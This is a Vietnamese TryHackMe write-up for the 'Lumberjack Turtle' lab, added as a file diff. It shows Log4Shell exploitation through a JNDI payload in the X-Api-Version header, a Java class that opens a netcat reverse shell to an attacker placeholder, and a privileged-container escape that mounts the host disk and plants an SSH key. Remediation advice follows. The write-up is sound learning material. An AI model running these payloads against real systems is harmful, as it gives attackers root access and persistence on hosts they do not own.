@@ -1,0 +1,162 @@
+---
+title: 'Lumberjack Turtle'
+description: 'A hidden /log4j endpoint is vulnerable to Log4Shell; exploiting it for root inside a privileged Docker container, then escaping to the host by mounting its raw disk and dropping an SSH key.'
+date: 2026-01-04
+platform: tryhackme
+room: 'Lumberjack Turtle'
+roomUrl: 'https://tryhackme.com/room/lumberjackturtle'
+difficulty: medium
+tags:
+  - 'log4shell'
+  - 'jndi'
+  - 'rce'
+  - 'docker'
+  - 'container-escape'
+  - 'linux'
+  - 'cve'
+vulnClasses:
+  - 'jndi injection'
+  - 'authenticated remote code execution'
+  - 'privileged container escape'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Lumberjack Turtle — Log4Shell Dẫn Đến Root, Rồi Escape Bằng Cách Mount Ổ Đĩa Của Một Container Có Đặc Quyền**
+
+_Bài viết tường thuật lại phòng "Lumberjack Turtle" trên TryHackMe. Một endpoint_ _`/log4j`_ _bị ẩn mắc lỗi Log4Shell (CVE-2021-44228); khai thác nó để lấy shell root trong một container Docker, rồi escape khỏi container hoàn toàn bằng cách mount ổ đĩa thô của host và gài khóa SSH của riêng mình._
+
+> Flag đã được ẩn đi. Lumberjack Turtle là một phòng lab được TryHackMe cho phép khai thác hợp pháp; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dưới dạng `<redacted>` là giá trị thật trên máy nhưng đã bị giữ lại, không công khai.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Brute-force thư mục trên một web service có tên khá lạ phát hiện ra một endpoint ẩn **`/~logs/log4j`**, và một response header gần như nêu tên thẳng lỗi: **CVE-2021-44228 (Log4Shell)** qua header `X-Api-Version` → dựng một chuỗi exploit JNDI/LDAP bằng `marshalsec` lấy được **shell root trong một container Docker** → hóa ra container này chạy ở chế độ **privileged**, nên các ổ đĩa thô của host hiện ra ngay từ trong container → mount phân vùng root của host và gài public key SSH của mình vào `/root/.ssh/authorized_keys` cho chúng ta một shell thật trên **chính host**, vượt qua một `root.txt` cố tình làm mồi nhử.
+
+Endpoint ẩn → Log4Shell JNDI RCE → root trong container privileged → mount ổ đĩa thô → gài khóa SSH → root thật trên host.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+Cổng 80 tự nhận mình là "Nagios NSCA," nhưng hành vi phản hồi không khớp — cần brute-force thư mục để tìm ra thứ gì đó thật.
+
+### **Lỗ hổng: một endpoint ẩn và một header tự nêu tên CVE của chính nó**
+
+```text
+gobuster dir -u http://$IP/ -w dirb/big.txt
+# /~logs  [Status: 200]
+gobuster dir -u http://$IP/~logs -w dirb/big.txt
+# /log4j  [Status: 200]
+```
+
+<Callout type="insight">
+
+Gọi `/~logs/log4j` trả về một response header, `X-THM-HINT: CVE-2021-44228 against X-Api-Version`, cho biết chính xác header nào mang injection và chính xác CVE nào cần khai thác — **Log4Shell**, lỗi remote-code-execution qua JNDI lookup của Log4j2.
+
+</Callout>
+
+### **Bước 1 — dựng chuỗi exploit JNDI/LDAP**
+
+```text
+git clone https://github.com/mbechler/marshalsec.git && cd marshalsec
+mvn clean package -DskipTests
+```
+
+```text
+# Exploit.java — chạy ngay khi được load, kết nối ngược về chúng ta
+static {
+    Runtime.getRuntime().exec("nc <attacker-ip> 4444 -e /bin/bash");
+}
+javac Exploit.java -source 8 -target 8
+```
+
+```text
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://<attacker-ip>:8080/#Exploit'
+python3 -m http.server 8080     # serve Exploit.class
+nc -lvnp 9999                   # bắt shell
+```
+
+### **Bước 2 — kích hoạt qua header dễ bị khai thác**
+
+```text
+curl "http://$IP/~logs/log4j" -H 'X-Api-Version: ${jndi:ldap://<attacker-ip>:1389/Exploit}'
+```
+
+```text
+# trên listener:
+id   # uid=0(root) gid=0(root)
+cat /opt/.flag1   # -> THM{<redacted>}
+```
+
+### **Bước 3 — một container privileged để lộ ổ đĩa thô của host**
+
+```text
+ip a
+# eth0: 172.17.0.2/16   <- địa chỉ dải cầu docker0 kinh điển, chúng ta đang trong một container
+```
+
+<Callout type="insight">
+
+Một container được sandbox đúng cách phải từ chối thẳng `fdisk -l` — các device node của ổ đĩa vật lý host đơn giản là không nên hiện ra. Thấy nó chạy thành công là dấu hiệu container này được khởi động với `--privileged` (hoặc một quyền `--device` tương đương), cho nó quyền truy cập trực tiếp vào phần cứng host.
+
+</Callout>
+
+```text
+fdisk -l
+# /dev/nvme0n1: 40 GiB  <- ổ đĩa root thật của host, hiện ra từ trong container
+mkdir /mnt/mount1
+mount /dev/nvme0n1p1 /mnt/mount1
+cat /mnt/mount1/root/root.txt
+# "Pffft. Come on. Look harder."   <- một mồi nhử cố ý
+```
+
+### **Bước 4 — gài khóa SSH và đăng nhập vào host thật**
+
+```text
+ssh-keygen -f ./id_rsa -N ''
+echo "<our-public-key>" >> /mnt/mount1/root/.ssh/authorized_keys
+```
+
+```text
+ssh -i id_rsa root@$IP
+# đây mới là host thật, không phải container
+ls -la          # một thư mục ẩn "..."
+cat "/root/.../._fLaG2"   # -> THM{<redacted>}
+```
+
+### **Mức độ ảnh hưởng**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 10.0** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`). RCE không cần xác thực dẫn tới root toàn bộ host, qua hai lỗi cấu hình nghiêm trọng độc lập với nhau:
+
+- **Log4Shell vẫn khai thác được** trên một endpoint tiếp cận được từ internet, cho remote code execution không cần xác thực.
+- **Một container privileged không có cách ly với phần cứng host** biến "root trong container" thành "root trên ổ đĩa vật lý" chỉ bằng một lệnh `mount` — không cần kernel exploit, không cần CVE breakout, chỉ cần một volume mount.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Nâng cấp Log4j lên ≥2.17.1**, hoặc tối thiểu tắt JNDI lookup (`log4j2.formatMsgNoLookups=true`) như một biện pháp khẩn cấp, và lọc/kiểm tra mọi giá trị header trước khi nó chạm tới một lệnh log.
+2. **Không bao giờ chạy container ứng dụng với** **`--privileged`\*\***.\*\* Chỉ cấp đúng những capability và device node mà workload thực sự cần, và chạy container rootless khi có thể.
+3. **Không bao giờ để một file** **`authorized_keys`** **dùng được bị ghi bởi một process chạy root trong bất kỳ container nào chia sẻ resource với host** — coi ranh giới container là đúng ranh giới tin cậy mà nó được thiết kế để là.
+
+</Callout>
+
+### **Những điều rút ra**
+
+- **Một response header có thể chính là tài liệu hướng dẫn khai thác.** Các lab dễ bị khai thác đôi khi gợi ý rất rõ, nhưng ngoài đời bài học vẫn áp dụng: kiểm tra mọi tên header được reflect lại xem có khả năng injection không.
+- **"Root trong container" và "root trên host" là hai thứ rất khác nhau — cho đến khi** **`--privileged`** **biến chúng thành một.** Luôn xác minh cách ly container trước khi cho rằng một lần container bị chiếm là đã được khống chế.
+- **Một flag mồi nhử vẫn là tín hiệu hữu ích.** Nếu một file "trophy" trông đáng ngờ như đang trêu đùa, rất có thể có một flag thật thứ hai ở gần đó.
+
+Cảm ơn đã đọc. Lumberjack Turtle kết hợp một trong những CVE có ảnh hưởng lớn nhất của internet với một mẫu hình container-escape cực dễ tái hiện mỗi khi `--privileged` được dùng vì tiện lợi hơn là vì cần thiết.
